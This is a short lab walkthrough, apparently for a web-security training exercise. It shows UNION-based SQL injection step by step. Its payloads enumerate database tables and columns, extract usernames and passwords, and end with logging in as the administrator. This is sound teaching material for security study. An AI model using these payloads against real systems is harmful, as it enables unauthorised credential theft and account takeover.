# Lab: SQL Injection Attack - Listing the Database Contents on Non-Oracle Databases

## Steps to Solve the Lab:

1. **Intercept the Request**  
   - Use Burp Suite to capture and modify the request that sets the product category filter.

2. **Determine the Number of Columns**  
   - Identify the number of columns returned by the query using:  
     ```sql
     '+UNION+SELECT+NULL,NULL--
     ```
   - Keep adding `NULL` values until the query executes without an error.

3. **Identify Columns Containing Text Data**  
   - Test which columns accept text by modifying the query:  
     ```sql
     '+UNION+SELECT+'abc','def'--
     ```
   - Ensure both columns accept string values.

4. **Retrieve the List of Tables**  
   - Use the following payload to retrieve the list of tables in the database:  
     ```sql
     '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
     ```
   - Identify the table that stores user credentials.

5. **Retrieve the List of Columns in the Users Table**  
   - Use the following payload (replacing the table name) to list the columns in the users table:  
     ```sql
     '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
     ```
   - Identify the columns that store usernames and passwords.

6. **Retrieve User Credentials**  
   - Use the following payload (replacing table and column names) to extract usernames and passwords:  
     ```sql
     '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
     ```
   - Locate the password for the `administrator` user.

7. **Login as Administrator**  
   - Use the extracted credentials to log in as the administrator.

## Expected Outcome:
- The usernames and passwords should be displayed in the response.
- The administrator's password can be used to log in successfully.
